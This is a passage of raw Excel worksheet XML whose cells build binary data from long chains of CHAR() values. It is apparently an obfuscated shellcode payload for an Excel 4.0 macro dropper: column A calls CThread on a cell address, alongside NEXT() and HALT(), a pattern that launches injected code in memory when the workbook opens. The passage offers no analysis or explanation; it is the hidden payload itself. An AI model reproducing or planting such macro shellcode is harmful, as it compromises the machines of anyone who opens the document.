AR(219)&amp;CHAR(231)&amp;CHAR(200)&amp;CHAR(129)&amp;CHAR(102)&amp;CHAR(190)&amp;CHAR(240)&amp;CHAR(25)&amp;CHAR(112)&amp;CHAR(18)&amp;CHAR(154)&amp;CHAR(114)&amp;CHAR(244)&amp;CHAR(141)&amp;CHAR(233)&amp;CHAR(176)&amp;CHAR(129)&amp;CHAR(214)&amp;CHAR(122)&amp;CHAR(159)&amp;CHAR(31)&amp;CHAR(151)&amp;CHAR(177)&amp;CHAR(185)&amp;CHAR(170)&amp;CHAR(104)&amp;CHAR(89)&amp;CHAR(26)&amp;CHAR(81)&amp;CHAR(132)&amp;CHAR(205)&amp;CHAR(156)&amp;CHAR(32)&amp;CHAR(203)&amp;CHAR(46)&amp;CHAR(219)&amp;CHAR(116)&amp;CHAR(226)&amp;CHAR(125)&amp;CHAR(157)&amp;CHAR(157)&amp;CHAR(16)&amp;CHAR(109)&amp;CHAR(168)&amp;CHAR(254)&amp;CHAR(15)&amp;CHAR(110)&amp;CHAR(17)&amp;CHAR(56)&amp;CHAR(167)&amp;CHAR(106)&amp;CHAR(203)&amp;CHAR(41)&amp;CHAR(101)&amp;CHAR(108)&amp;CHAR(189)&amp;CHAR(47)&amp;CHAR(111)&amp;CHAR(46)&amp;CHAR(129)&amp;CHAR(22)&amp;CHAR(225)&amp;CHAR(29)&amp;CHAR(42)&amp;CHAR(56)&amp;CHAR(42)&amp;CHAR(238)&amp;CHAR(152)&amp;CHAR(127)&amp;CHAR(62)&amp;CHAR(158)&amp;CHAR(32)&amp;CHAR(178)&amp;CHAR(172)&amp;CHAR(81)&amp;CHAR(147)&amp;CHAR(57)&amp;CHAR(164)&amp;CHAR(235)&amp;CHAR(156)&amp;CHAR(146)&amp;CHAR(47)&amp;CHAR(31)&amp;CHAR(249)&amp;CHAR(109)&amp;CHAR(247)&amp;CHAR(228)&amp;CHAR(204)&amp;CHAR(117)&amp;CHAR(226)&amp;CHAR(127)&amp;CHAR(175)&amp;CHAR(9)&amp;CHAR(151)&amp;CHAR(30)&amp;CHAR(53)&amp;CHAR(225)&amp;CHAR(78)&amp;CHAR(244)&amp;CHAR(115)&amp;CHAR(178)&amp;CHAR(116)&amp;CHAR(183)</f>
        <v>|´¾ÇÔZR_x0003_™+z~_x0002__x000C_d‘_x0007_ú×Ã[;ÆVKÿÚÅ-R«¦_x000F_¶_vds_x0004_Í&gt;"¢8;ŠÉ_x0003_kv¯øWS‰_x001B_D_x001D_Y÷–þh&gt;ÔncX_x001A_Fâ_x0002_~c—_x000D_&amp;°—ÎÅ _x000E_	±á+›$ré[€ï¹[²¹s C3Yéø¿ë|ôÅ_x0010_¾×¦¹_x0002__x001F_GtŒ¦ÝÑ¿RçaàFë_x0014_ÐÙ|‹B„_x001F_6-á7.úÐ@_x0002_Ü5ZðÛçÈf¾ð_x0019_p_x0012_šrôé°ÖzŸ_x001F_—±¹ªhY_x001A_Q„Íœ Ë.Ûtâ}_x0010_m¨þ_x000F_n_x0011_8§jË)el½/o._x0016_á_x001D_*8*î˜&gt;ž ²¬Q“9¤ëœ’/_x001F_ùm÷äÌuâ¯	—_x001E_5áNôs²t·</v>
      </c>
      <c r="C17" t="str">
        <f>CHAR(189)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(152)&amp;CHAR(188)&amp;CHAR(189)&amp;CHAR(249)&amp;CHAR(206)&amp;CHAR(147)&amp;CHAR(235)</f>
        <v>½ë÷˜¼½ùÎ“ë</v>
      </c>
    </row>
    <row r="18" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A18" t="b">
        <f>NEXT()</f>
        <v>0</v>
      </c>
      <c r="B18" t="str">
        <f>CHAR(59)&amp;CHAR(6)&amp;CHAR(92)&amp;CHAR(19)&amp;CHAR(54)&amp;CHAR(138)&amp;CHAR(143)&amp;CHAR(234)&amp;CHAR(166)&amp;CHAR(21)&amp;CHAR(107)&amp;CHAR(35)&amp;CHAR(52)&amp;CHAR(136)&amp;CHAR(37)&amp;CHAR(147)&amp;CHAR(224)&amp;CHAR(104)&amp;CHAR(137)&amp;CHAR(16)&amp;CHAR(238)&amp;CHAR(185)&amp;CHAR(23)&amp;CHAR(9)&amp;CHAR(122)&amp;CHAR(100)&amp;CHAR(136)&amp;CHAR(74)&amp;CHAR(28)&amp;CHAR(233)&amp;CHAR(195)&amp;CHAR(185)&amp;CHAR(212)&amp;CHAR(103)&amp;CHAR(37)&amp;CHAR(147)&amp;CHAR(202)&amp;CHAR(27)&amp;CHAR(155)&amp;CHAR(42)&amp;CHAR(33)&amp;CHAR(39)&amp;CHAR(163)&amp;CHAR(165)&amp;CHAR(6)&amp;CHAR(249)&amp;CHAR(215)&amp;CHAR(184)&amp;CHAR(126)&amp;CHAR(71)&amp;CHAR(183)&amp;CHAR(172)&amp;CHAR(36)&amp;CHAR(33)&amp;CHAR(121)&amp;CHAR(244)&amp;CHAR(52)&amp;CHAR(125)&amp;CHAR(144)&amp;CHAR(28)&amp;CHAR(253)&amp;CHAR(48)&amp;CHAR(69)&amp;CHAR(244)&amp;CHAR(83)&amp;CHAR(138)&amp;CHAR(90)&amp;CHAR(172)&amp;CHAR(38)&amp;CHAR(246)&amp;CHAR(78)&amp;CHAR(17)&amp;CHAR(211)&amp;CHAR(251)&amp;CHAR(2)&amp;CHAR(41)&amp;CHAR(178)&amp;CHAR(17)&amp;CHAR(53)&amp;CHAR(44)&amp;CHAR(231)&amp;CHAR(128)&amp;CHAR(48)&amp;CHAR(160)&amp;CHAR(36)&amp;CHAR(179)&amp;CHAR(32)&amp;CHAR(225)&amp;CHAR(117)&amp;CHAR(238)&amp;CHAR(224)&amp;CHAR(112)&amp;CHAR(202)&amp;CHAR(237)&amp;CHAR(9)&amp;CHAR(128)&amp;CHAR(205)&amp;CHAR(43)&amp;CHAR(46)&amp;CHAR(113)&amp;CHAR(28)&amp;CHAR(155)&amp;CHAR(153)&amp;CHAR(16)&amp;CHAR(150)&amp;CHAR(193)&amp;CHAR(66)&amp;CHAR(130)&amp;CHAR(131)&amp;CHAR(200)&amp;CHAR(176)&amp;CHAR(237)&amp;CHAR(198)&amp;CHAR(175)&amp;CHAR(185)&amp;CHAR(132)&amp;CHAR(233)&amp;CHAR(112)&amp;CHAR(57)&amp;CHAR(118)&amp;CHAR(255)&amp;CHAR(200)&amp;CHAR(154)&amp;CHAR(35)&amp;CHAR(221)&amp;CHAR(21)&amp;CHAR(240)&amp;CHAR(33)&amp;CHAR(16)&amp;CHAR(74)&amp;CHAR(229)&amp;CHAR(134)&amp;CHAR(22)&amp;CHAR(101)&amp;CHAR(37)&amp;CHAR(79)&amp;CHAR(29)&amp;CHAR(241)&amp;CHAR(216)&amp;CHAR(151)&amp;CHAR(250)&amp;CHAR(233)&amp;CHAR(109)&amp;CHAR(136)&amp;CHAR(168)&amp;CHAR(56)&amp;CHAR(89)&amp;CHAR(137)&amp;CHAR(16)&amp;CHAR(48)&amp;CHAR(214)&amp;CHAR(154)&amp;CHAR(55)&amp;CHAR(78)&amp;CHAR(52)&amp;CHAR(113)&amp;CHAR(195)&amp;CHAR(245)&amp;CHAR(153)&amp;CHAR(104)&amp;CHAR(63)&amp;CHAR(234)&amp;CHAR(121)&amp;CHAR(12)&amp;CHAR(151)&amp;CHAR(53)&amp;CHAR(157)&amp;CHAR(134)&amp;CHAR(238)&amp;CHAR(40)&amp;CHAR(123)&amp;CHAR(249)&amp;CHAR(141)&amp;CHAR(72)&amp;CHAR(108)&amp;CHAR(175)&amp;CHAR(145)&amp;CHAR(93)&amp;CHAR(195)&amp;CHAR(30)&amp;CHAR(131)&amp;CHAR(246)&amp;CHAR(238)&amp;CHAR(13)&amp;CHAR(163)&amp;CHAR(158)&amp;CHAR(238)&amp;CHAR(225)&amp;CHAR(165)&amp;CHAR(96)&amp;CHAR(212)&amp;CHAR(33)&amp;CHAR(128)&amp;CHAR(28)&amp;CHAR(32)&amp;CHAR(58)&amp;CHAR(96)&amp;CHAR(38)&amp;CHAR(142)&amp;CHAR(187)&amp;CHAR(219)&amp;CHAR(25)&amp;CHAR(168)&amp;CHAR(117)&amp;CHAR(119)&amp;CHAR(124)&amp;CHAR(112)&amp;CHAR(30)&amp;CHAR(161)&amp;CHAR(254)&amp;CHAR(73)&amp;CHAR(149)&amp;CHAR(37)&amp;CHAR(211)&amp;CHAR(24)&amp;CHAR(143)&amp;CHAR(180)&amp;CHAR(81)&amp;CHAR(156)&amp;CHAR(65)&amp;CHAR(89)&amp;CHAR(122)&amp;CHAR(159)&amp;CHAR(80)&amp;CHAR(237)&amp;CHAR(243)&amp;CHAR(242)&amp;CHAR(232)&amp;CHAR(84)&amp;CHAR(111)&amp;CHAR(67)&amp;CHAR(161)&amp;CHAR(207)&amp;CHAR(34)&amp;CHAR(12)&amp;CHAR(191)&amp;CHAR(123)&amp;CHAR(163)&amp;CHAR(116)&amp;CHAR(224)&amp;CHAR(9)&amp;CHAR(4)&amp;CHAR(36)&amp;CHAR(113)&amp;CHAR(15)&amp;CHAR(21)&amp;CHAR(189)&amp;CHAR(88)&amp;CHAR(196)&amp;CHAR(112)&amp;CHAR(149)&amp;CHAR(220)&amp;CHAR(15)&amp;CHAR(249)&amp;CHAR(59)</f>
        <v>;_x0006_\_x0013_6Šê¦_x0015_k#4ˆ%“àh‰_x0010_î¹_x0017_	zdˆJ_x001C_éÃ¹Ôg%“Ê_x001B_›*!'£¥_x0006_ù×¸~G·¬$!yô4}_x001C_ý0EôSŠZ¬&amp;öN_x0011_Óû_x0002_)²_x0011_5,ç€0 $³ áuîàpÊí	€Í+.q_x001C_›™_x0010_–ÁB‚ƒÈ°íÆ¯¹„ép9vÿÈš#Ý_x0015_ð!_x0010_Jå†_x0016_e%O_x001D_ñØ—úémˆ¨8Y‰_x0010_0Öš7N4qÃõ™h?êy_x000C_—5†î({ùHl¯‘]Ã_x001E_ƒöî_x000D_£žîá¥`Ô!€_x001C_ :`&amp;Ž»Û_x0019_¨uw|p_x001E_¡þI•%Ó_x0018_´QœAYzŸPíóòèToC¡Ï"_x000C_¿{£tà	_x0004_$q_x000F__x0015_½XÄp•Ü_x000F_ù;</v>
      </c>
      <c r="C18" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(11)&amp;CHAR(96)&amp;CHAR(213)&amp;CHAR(142)&amp;CHAR(243)&amp;CHAR(96)&amp;CHAR(195)&amp;CHAR(216)</f>
        <v>÷ý_x000B_`ÕŽó`ÃØ</v>
      </c>
    </row>
    <row r="19" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A19" t="e">
        <f>CThread(0,0,A9,0,0,0)</f>
        <v>#NAME?</v>
      </c>
      <c r="B19" t="str">
        <f>CHAR(254)&amp;CHAR(159)&amp;CHAR(175)&amp;CHAR(117)&amp;CHAR(114)&amp;CHAR(98)&amp;CHAR(78)&amp;CHAR(78)&amp;CHAR(126)&amp;CHAR(241)&amp;CHAR(176)&amp;CHAR(218)&amp;CHAR(218)&amp;CHAR(20)&amp;CHAR(216)&amp;CHAR(69)&amp;CHAR(228)&amp;CHAR(153)&amp;CHAR(123)&amp;CHAR(65)&amp;CHAR(123)&amp;CHAR(31)&amp;CHAR(193)&amp;CHAR(204)&amp;CHAR(151)&amp;CHAR(104)&amp;CHAR(190)&amp;CHAR(90)&amp;CHAR(21)&amp;CHAR(206)&amp;CHAR(121)&amp;CHAR(233)&amp;CHAR(100)&amp;CHAR(197)&amp;CHAR(93)&amp;CHAR(1)&amp;CHAR(201)&amp;CHAR(217)&amp;CHAR(190)&amp;CHAR(68)&amp;CHAR(79)&amp;CHAR(251)&amp;CHAR(121)&amp;CHAR(178)&amp;CHAR(76)&amp;CHAR(197)&amp;CHAR(180)&amp;CHAR(198)&amp;CHAR(127)&amp;CHAR(215)&amp;CHAR(111)&amp;CHAR(220)&amp;CHAR(105)&amp;CHAR(44)&amp;CHAR(183)&amp;CHAR(228)&amp;CHAR(14)&amp;CHAR(33)&amp;CHAR(166)&amp;CHAR(166)&amp;CHAR(124)&amp;CHAR(202)&amp;CHAR(178)&amp;CHAR(253)&amp;CHAR(176)&amp;CHAR(71)&amp;CHAR(143)&amp;CHAR(13)&amp;CHAR(51)&amp;CHAR(64)&amp;CHAR(98)&amp;CHAR(129)&amp;CHAR(75)&amp;CHAR(138)&amp;CHAR(218)&amp;CHAR(242)&amp;CHAR(238)&amp;CHAR(112)&amp;CHAR(159)&amp;CHAR(221)&amp;CHAR(77)&amp;CHAR(82)&amp;CHAR(168)&amp;CHAR(104)&amp;CHAR(31)&amp;CHAR(193)&amp;CHAR(13)&amp;CHAR(126)&amp;CHAR(17)&amp;CHAR(124)&amp;CHAR(203)&amp;CHAR(11)&amp;CHAR(184)&amp;CHAR(228)&amp;CHAR(169)&amp;CHAR(79)&amp;CHAR(208)&amp;CHAR(39)&amp;CHAR(223)&amp;CHAR(254)&amp;CHAR(9)&amp;CHAR(106)&amp;CHAR(219)&amp;CHAR(43)&amp;CHAR(231)&amp;CHAR(226)&amp;CHAR(157)&amp;CHAR(121)&amp;CHAR(178)&amp;CHAR(144)&amp;CHAR(233)&amp;CHAR(183)&amp;CHAR(202)&amp;CHAR(186)&amp;CHAR(58)&amp;CHAR(15)&amp;CHAR(82)&amp;CHAR(69)&amp;CHAR(140)&amp;CHAR(172)&amp;CHAR(180)&amp;CHAR(172)&amp;CHAR(223)&amp;CHAR(43)&amp;CHAR(51)&amp;CHAR(252)&amp;CHAR(229)&amp;CHAR(114)&amp;CHAR(53)&amp;CHAR(109)&amp;CHAR(150)&amp;CHAR(228)&amp;CHAR(39)&amp;CHAR(176)&amp;CHAR(160)&amp;CHAR(51)&amp;CHAR(205)&amp;CHAR(21)&amp;CHAR(66)&amp;CHAR(38)&amp;CHAR(91)&amp;CHAR(247)&amp;CHAR(154)&amp;CHAR(230)&amp;CHAR(212)&amp;CHAR(160)&amp;CHAR(118)&amp;CHAR(61)&amp;CHAR(65)&amp;CHAR(187)&amp;CHAR(168)&amp;CHAR(71)&amp;CHAR(76)&amp;CHAR(163)&amp;CHAR(90)&amp;CHAR(92)&amp;CHAR(31)&amp;CHAR(239)&amp;CHAR(101)&amp;CHAR(138)&amp;CHAR(92)&amp;CHAR(55)&amp;CHAR(33)&amp;CHAR(103)&amp;CHAR(142)&amp;CHAR(168)&amp;CHAR(21)&amp;CHAR(94)&amp;CHAR(139)&amp;CHAR(232)&amp;CHAR(76)&amp;CHAR(182)&amp;CHAR(39)&amp;CHAR(115)&amp;CHAR(231)&amp;CHAR(50)&amp;CHAR(215)&amp;CHAR(124)&amp;CHAR(204)&amp;CHAR(114)&amp;CHAR(218)&amp;CHAR(79)&amp;CHAR(101)&amp;CHAR(53)&amp;CHAR(89)&amp;CHAR(34)&amp;CHAR(234)&amp;CHAR(147)&amp;CHAR(187)&amp;CHAR(125)&amp;CHAR(73)&amp;CHAR(151)&amp;CHAR(245)&amp;CHAR(18)&amp;CHAR(201)&amp;CHAR(118)&amp;CHAR(50)&amp;CHAR(2)&amp;CHAR(42)&amp;CHAR(219)&amp;CHAR(143)&amp;CHAR(184)&amp;CHAR(82)&amp;CHAR(159)&amp;CHAR(111)&amp;CHAR(212)&amp;CHAR(148)&amp;CHAR(108)&amp;CHAR(185)&amp;CHAR(172)&amp;CHAR(187)&amp;CHAR(167)&amp;CHAR(198)&amp;CHAR(35)&amp;CHAR(151)&amp;CHAR(50)&amp;CHAR(225)&amp;CHAR(1)&amp;CHAR(144)&amp;CHAR(124)&amp;CHAR(112)&amp;CHAR(178)&amp;CHAR(126)&amp;CHAR(201)&amp;CHAR(228)&amp;CHAR(141)&amp;CHAR(111)&amp;CHAR(195)&amp;CHAR(3)&amp;CHAR(179)&amp;CHAR(130)&amp;CHAR(233)&amp;CHAR(228)&amp;CHAR(117)&amp;CHAR(12)&amp;CHAR(160)&amp;CHAR(6)&amp;CHAR(54)&amp;CHAR(142)&amp;CHAR(158)&amp;CHAR(244)&amp;CHAR(158)&amp;CHAR(127)&amp;CHAR(223)&amp;CHAR(167)&amp;CHAR(40)&amp;CHAR(33)&amp;CHAR(51)&amp;CHAR(193)&amp;CHAR(73)&amp;CHAR(103)&amp;CHAR(142)&amp;CHAR(243)&amp;CHAR(237)&amp;CHAR(58)</f>
        <v>þŸ¯urbNN~ñ°ÚÚ_x0014_ØEä™{A{_x001F_ÁÌ—h¾Z_x0015_ÎyédÅ]_x0001_ÉÙ¾DOûy²LÅ´Æ×oÜi,·ä_x000E_!¦¦|Ê²ý°G_x000D_3@bKŠÚòîpŸÝMR¨h_x001F_Á_x000D_~_x0011_|Ë_x000B_¸ä©OÐ'ßþ	jÛ+çây²é·Êº:_x000F_REŒ¬´¬ß+3üår5m–ä'° 3Í_x0015_B&amp;[÷šæÔ v=A»¨GL£Z\_x001F_ïeŠ\7!gŽ¨_x0015_^‹èL¶'sç2×|ÌrÚOe5Y"ê“»}I—õ_x0012_Év2_x0002_*Û¸RŸoÔ”l¹¬»§Æ#—2á_x0001_|p²~ÉäoÃ_x0003_³‚éäu_x000C_ _x0006_6Žžôžß§(!3ÁIgŽóí:</v>
      </c>
      <c r="C19" t="str">
        <f>CHAR(220)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(243)&amp;CHAR(104)&amp;CHAR(49)&amp;CHAR(221)&amp;CHAR(189)&amp;CHAR(191)</f>
        <v>Ü6Íëóh1Ý½¿</v>
      </c>
    </row>
    <row r="20" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A20" t="b">
        <f>HALT()</f>
        <v>0</v>
      </c>
      <c r="B20" t="str">
        <f>CHAR(6)&amp;CHAR(22)&amp;CHAR(158)&amp;CHAR(79)&amp;CHAR(34)&amp;CHAR(148)&amp;CHAR(216)&amp;CHAR(101)&amp;CHAR(89)&amp;CHAR(9)&amp;CHAR(250)&amp;CHAR(222)&amp;CHAR(180)&amp;CHAR(254)&amp;CHAR(108)&amp;CHAR(158)&amp;CHAR(70)&amp;CHAR(80)&amp;CHAR(16)&amp;CHAR(132)&amp;CHAR(127)&amp;CHAR(232)&amp;CHAR(159)&amp;CHAR(171)&amp;CHAR(208)&amp;CHAR(89)&amp;CHAR(210)&amp;CHAR(169)&amp;CHAR(50)&amp;CHAR(186)&amp;CHAR(70)&amp;CHAR(200)&amp;CHAR(87)&amp;CHAR(255)&amp;CHAR(82)&amp;CHAR(90)&amp;CHAR(101)&amp;CHAR(243)&amp;CHAR(9)&amp;CHAR(176)&amp;CHAR(145)&amp;CHAR(229)&amp;CHAR(255)&amp;CHAR(56)&amp;CHAR(62)&amp;CHAR(93)&amp;CHAR(235)&amp;CHAR(128)&amp;CHAR(154)&amp;CHAR(49)&amp;CHAR(248)&amp;CHAR(189)&amp;CHAR(217)&amp;CHAR(250)&amp;CHAR(139)&amp;CHAR(66)&amp;CHAR(9)&amp;CHAR(21)&amp;CHAR(231)&amp;CHAR(163)&amp;CHAR(30)&amp;CHAR(179)&amp;CHAR(40)&amp;CHAR(42)&amp;CHAR(94)&amp;CHAR(196)&amp;CHAR(13)&amp;CHAR(203)&amp;CHAR(227)&amp;CHAR(99)&amp;CHAR(60)&amp;CHAR(6)&amp;CHAR(76)&amp;CHAR(183)&amp;CHAR(18)&amp;CHAR(80)&amp;CHAR(106)&amp;CHAR(46)&amp;CHAR(136)&amp;CHAR(71)&amp;CHAR(68)&amp;CHAR(191)&amp;CHAR(127)&amp;CHAR(216)&amp;CHAR(170)&amp;CHAR(213)&amp;CHAR(103)&amp;CHAR(69)&amp;CHAR(214)&amp;CHAR(152)&amp;CHAR(177)&amp;CHAR(196)&amp;CHAR(219)&amp;CHAR(26)&amp;CHAR(151)&amp;CHAR(90)&amp;CHAR(237)&amp;CHAR(146)&amp;CHAR(101)&amp;CHAR(204)&amp;CHAR(40)&amp;CHAR(42)&amp;CHAR(60)&amp;CHAR(242)&amp;CHAR(40)&amp;CHAR(37)&amp;CHAR(112)&amp;CHAR(50)&amp;CHAR(129)&amp;CHAR(27)&amp;CHAR(251)&amp;CHAR(44)&amp;CHAR(69)&amp;CHAR(196)&amp;CHAR(74)&amp;CHAR(48)&amp;CHAR(66)&amp;CHAR(226)&amp;CHAR(100)&amp;CHAR(4)&amp;CHAR(88)&amp;CHAR(18)&amp;CHAR(155)&amp;CHAR(140)&amp;CHAR(157)&amp;CHAR(129)&amp;CHAR(106)&amp;CHAR(130)&amp;CHAR(14)&amp;CHAR(125)&amp;CHAR(175)&amp;CHAR(123)&amp;CHAR(154)&amp;CHAR(79)&amp;CHAR(51)&amp;CHAR(255)&amp;CHAR(74)&amp;CHAR(13)&amp;CHAR(134)&amp;CHAR(62)&amp;CHAR(204)&amp;CHAR(112)&amp;CHAR(240)&amp;CHAR(255)&amp;CHAR(66)&amp;CHAR(57)&amp;CHAR(140)&amp;CHAR(54)&amp;CHAR(231)&amp;CHAR(219)&amp;CHAR(235)&amp;CHAR(113)&amp;CHAR(20)&amp;CHAR(97)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(109)&amp;CHAR(124)&amp;CHAR(77)&amp;CHAR(34)&amp;CHAR(83)&amp;CHAR(133)&amp;CHAR(116)&amp;CHAR(184)&amp;CHAR(218)&amp;CHAR(88)&amp;CHAR(212)&amp;CHAR(8)&amp;CHAR(79)&amp;CHAR(84)&amp;CHAR(154)&amp;CHAR(198)&amp;CHAR(98)&amp;CHAR(246)&amp;CHAR(170)&amp;CHAR(186)&amp;CHAR(193)&amp;CHAR(164)&amp;CHAR(3)&amp;CHAR(195)&amp;CHAR(182)&amp;CHAR(45)&amp;CHAR(252)&amp;CHAR(175)&amp;CHAR(165)&amp;CHAR(6)&amp;CHAR(153)&amp;CHAR(18)&amp;CHAR(209)&amp;CHAR(224)&amp;CHAR(154)&amp;CHAR(51)&amp;CHAR(7)&amp;CHAR(231)&amp;CHAR(150)&amp;CHAR(255)&amp;CHAR(218)&amp;CHAR(45)&amp;CHAR(28)&amp;CHAR(35)&amp;CHAR(244)&amp;CHAR(136)&amp;CHAR(104)&amp;CHAR(17)&amp;CHAR(17)&amp;CHAR(64)&amp;CHAR(102)&amp;CHAR(66)&amp;CHAR(215)&amp;CHAR(205)&amp;CHAR(43)&amp;CHAR(116)&amp;CHAR(77)&amp;CHAR(60)&amp;CHAR(190)&amp;CHAR(218)&amp;CHAR(252)&amp;CHAR(86)&amp;CHAR(198)&amp;CHAR(153)&amp;CHAR(105)&amp;CHAR(156)&amp;CHAR(76)&amp;CHAR(179)&amp;CHAR(51)&amp;CHAR(82)&amp;CHAR(218)&amp;CHAR(94)&amp;CHAR(157)&amp;CHAR(121)&amp;CHAR(64)&amp;CHAR(41)&amp;CHAR(48)&amp;CHAR(12)&amp;CHAR(173)&amp;CHAR(15)&amp;CHAR(245)&amp;CHAR(19)&amp;CHAR(125)&amp;CHAR(220)&amp;CHAR(198)&amp;CHAR(24)&amp;CHAR(123)&amp;CHAR(177)&amp;CHAR(37)&amp;CHAR(226)&amp;CHAR(67)&amp;CHAR(191)&amp;CHAR(183)&amp;CHAR(144)&amp;CHAR(7)&amp;CHAR(198)&amp;CHAR(217)&amp;CHAR(15)&amp;CHAR(87)</f>
        <v>_x0006__x0016_žO"”ØeY	úÞ´þlžFP_x0010_„èŸ«ÐYÒ©2ºFÈWÿRZeó	°‘åÿ8&gt;]ë€š1ø½Ùú‹B	_x0015_ç£_x001E_³(*^Ä_x000D_Ëãc&lt;_x0006_L·_x0012_Pj.ˆGD¿ØªÕgEÖ˜±ÄÛ_x001A_—Zí’eÌ(*&lt;ò(%p2_x001B_û,EÄJ0Bâd_x0004_X_x0012_›Œj‚_x000E_}¯{šO3ÿJ_x000D_†&gt;ÌpðÿB9Œ6çÛëq_x0014_aûÏm|M"S…t¸ÚXÔ_x0008_OTšÆböªºÁ¤_x0003_Ã¶-ü¯¥_x0006_™_x0012_Ñàš3_x0007_ç–ÿÚ-_x001C_#ôˆh_x0011__x0011_@fB×Í+tM&lt;¾ÚüVÆ™iœL³3RÚ^y@)0_x000C_­_x000F_õ_x0013_}ÜÆ_x0018_{±%âC¿·_x0007_ÆÙ_x000F_W</v>
      </c>
      <c r="C20" t="str">
        <f>CHAR(61)&amp;CHAR(163)&amp;CHAR(54)&amp;CHAR(254)&amp;CHAR(91)&amp;CHAR(251)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(133)&amp;CHAR(102)</f>
        <v>=£6þ[ûô6…f</v>
      </c>
    </row>
    <row r="21" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A21">
        <v>1342177280</v>
      </c>
      <c r="B21" t="str">
        <f>CHAR(161)&amp;CHAR(245)&amp;CHAR(184)&amp;CHAR(164)&amp;CHAR(67)&amp;CHAR(170)&amp;CHAR(89)&amp;CHAR(42)&amp;CHAR(74)&amp;CHAR(241)&amp;CHAR(74)&amp;CHAR(128)&amp;CHAR(169)&amp;CHAR(42)&amp;CHAR(245)&amp;CHAR(1)&amp;CHAR(29)&amp;CHAR(127)&amp;CHAR(175)&amp;CHAR(48)&amp;CHAR(101)&amp;CHAR(139)&amp;CHAR(126)&amp;CHAR(209)&amp;CHAR(184)&amp;CHAR(72)&amp;CHAR(22)&amp;CHAR(212)&amp;CHAR(80)&amp;CHAR(224)&amp;CHAR(194)&amp;CHAR(253)&amp;CHAR(252)&amp;CHAR(219)&amp;CHAR(237)&amp;CHAR(15)&amp;CHAR(221)&amp;CHAR(6)&amp;CHAR(249)&amp;CHAR(56)&amp;CHAR(239)&amp;CHAR(131)&amp;CHAR(248)&amp;CHAR(137)&amp;CHAR(87)&amp;CHAR(58)&amp;CHAR(199)&amp;CHAR(58)&amp;CHAR(166)&amp;CHAR(129)&amp;CHAR(175)&amp;CHAR(89)&amp;CHAR(29)&amp;CHAR(161)&amp;CHAR(181)&amp;CHAR(193)&amp;CHAR(183)&amp;CHAR(31)&amp;CHAR(190)&amp;CHAR(237)&amp;CHAR(216)&amp;CHAR(77)&amp;CHAR(138)&amp;CHAR(151)&amp;CHAR(118)&amp;CHAR(51)&amp;CHAR(143)&amp;CHAR(90)&amp;CHAR(229)&amp;CHAR(91)&amp;CHAR(199)&amp;CHAR(245)&amp;CHAR(117)&amp;CHAR(107)&amp;CHAR(230)&amp;CHAR(248)&amp;CHAR(170)&amp;CHAR(74)&amp;CHAR(89)&amp;CHAR(147)&amp;CHAR(169)&amp;CHAR(100)&amp;CHAR(138)&amp;CHAR(120)&amp;CHAR(131)&amp;CHAR(208)&amp;CHAR(154)&amp;CHAR(193)&amp;CHAR(194)&amp;CHAR(108)&amp;CHAR(129)&amp;CHAR(160)&amp;CHAR(254)&amp;CHAR(45)&amp;CHAR(163)&amp;CHAR(26)&amp;CHAR(245)&amp;CHAR(36)&amp;CHAR(27)&amp;CHAR(208)&amp;CHAR(95)&amp;CHAR(253)&amp;CHAR(178)&amp;CHAR(241)&amp;CHAR(85)&amp;CHAR(91)&amp;CHAR(185)&amp;CHAR(138)&amp;CHAR(27)&amp;CHAR(156)&amp;CHAR(207)&amp;CHAR(77)&amp;CHAR(244)&amp;CHAR(90)&amp;CHAR(46)&amp;CHAR(158)&amp;CHAR(89)&amp;CHAR(138)&amp;CHAR(74)&amp;CHAR(11)&amp;CHAR(131)&amp;CHAR(80)&amp;CHAR(115)&amp;CHAR(115)&amp;CHAR(98)&amp;CHAR(198)&amp;CHAR(239)&amp;CHAR(246)&amp;CHAR(50)&amp;CHAR(78)&amp;CHAR(108)&amp;CHAR(202)&amp;CHAR(152)&amp;CHAR(205)&amp;CHAR(97)&amp;CHAR(132)&amp;CHAR(52)&amp;CHAR(140)&amp;CHAR(81)&amp;CHAR(225)&amp;CHAR(171)&amp;CHAR(2)&amp;CHAR(214)&amp;CHAR(195)&amp;CHAR(89)&amp;CHAR(242)&amp;CHAR(91)&amp;CHAR(47)&amp;CHAR(174)&amp;CHAR(31)&amp;CHAR(173)&amp;CHAR(125)&amp;CHAR(236)&amp;CHAR(160)&amp;CHAR(187)&amp;CHAR(211)&amp;CHAR(105)&amp;CHAR(35)&amp;CHAR(91)&amp;CHAR(233)&amp;CHAR(33)&amp;CHAR(62)&amp;CHAR(21)&amp;CHAR(36)&amp;CHAR(249)&amp;CHAR(92)&amp;CHAR(139)&amp;CHAR(156)&amp;CHAR(60)&amp;CHAR(28)&amp;CHAR(91)&amp;CHAR(196)&amp;CHAR(3)&amp;CHAR(122)&amp;CHAR(157)&amp;CHAR(105)&amp;CHAR(32)&amp;CHAR(128)&amp;CHAR(142)&amp;CHAR(34)&amp;CHAR(243)&amp;CHAR(36)&amp;CHAR(134)&amp;CHAR(184)&amp;CHAR(86)&amp;CHAR(236)&amp;CHAR(215)&amp;CHAR(10)&amp;CHAR(97)&amp;CHAR(3)&amp;CHAR(199)&amp;CHAR(68)&amp;CHAR(85)&amp;CHAR(20)&amp;CHAR(217)&amp;CHAR(217)&amp;CHAR(227)&amp;CHAR(95)&amp;CHAR(47)&amp;CHAR(51)&amp;CHAR(94)&amp;CHAR(136)&amp;CHAR(195)&amp;CHAR(160)&amp;CHAR(81)&amp;CHAR(139)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(15)&amp;CHAR(141)&amp;CHAR(248)&amp;CHAR(255)&amp;CHAR(5)&amp;CHAR(103)&amp;CHAR(16)&amp;CHAR(114)&amp;CHAR(3)&amp;CHAR(168)&amp;CHAR(77)&amp;CHAR(150)&amp;CHAR(175)&amp;CHAR(49)&amp;CHAR(106)&amp;CHAR(145)&amp;CHAR(170)&amp;CHAR(105)&amp;CHAR(31)&amp;CHAR(14)&amp;CHAR(149)&amp;CHAR(135)&amp;CHAR(223)&amp;CHAR(211)&amp;CHAR(67)&amp;CHAR(62)&amp;CHAR(60)&amp;CH